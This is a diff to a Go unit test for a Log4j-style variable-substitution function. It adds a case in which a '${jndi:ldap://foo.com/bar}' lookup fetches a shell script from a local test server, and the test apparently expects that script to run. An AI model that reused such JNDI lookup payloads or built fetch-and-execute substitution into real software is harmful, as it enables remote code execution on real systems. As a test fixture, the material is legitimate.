@@ -14,8 +14,9 @@ func TestSubst(t *testing.T) {
 		"USER": "alice",
 		"HOME": "/home/alice",
 	}
+	var responseFormat string
 	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		fmt.Fprintf(w, "got-path=%v", r.URL.Path)
+		fmt.Fprintf(w, responseFormat, r.URL.Path)
 	}))
 	defer ts.Close()
 
@@ -32,15 +33,20 @@ func TestSubst(t *testing.T) {
 		},
 	}
 	tests := []struct {
-		in, want string
+		in, format, want string
 	}{
-		{"foo${env:user}bar", "fooalicebar"},
-		{"lower ${lower:FOO}", "lower foo"},
-		{"upper ${upper:foo}", "upper FOO"},
-		{"nested ${env:${lower:u}ser}", "nested alice"},
-		{"hit network: ${jndi:ldap://foo.com/bar}", "hit network: got-path=/bar"},
+		{in: "foo${env:user}bar", want: "fooalicebar"},
+		{in: "lower ${lower:FOO}", want: "lower foo"},
+		{in: "upper ${upper:foo}", want: "upper FOO"},
+		{in: "nested ${env:${lower:u}ser}", want: "nested alice"},
+		{in: "hit network: ${jndi:ldap://foo.com/bar}", want: "hit network: got-path=/bar"},
+		{in: "hit network: ${jndi:ldap://foo.com/bar}", want: "hit network: got-path=/bar", format: "#!/bin/sh\n#%v\necho -n got-path=$PATH_INFO"},
 	}
 	for _, tt := range tests {
+		responseFormat = "got-path=%v"
+		if tt.format != "" {
+			responseFormat = tt.format
+		}
 		if got := e.subst(tt.in); got != tt.want {
 			t.Errorf("subst(%q) = %q; want %q", tt.in, got, tt.want)
 		}
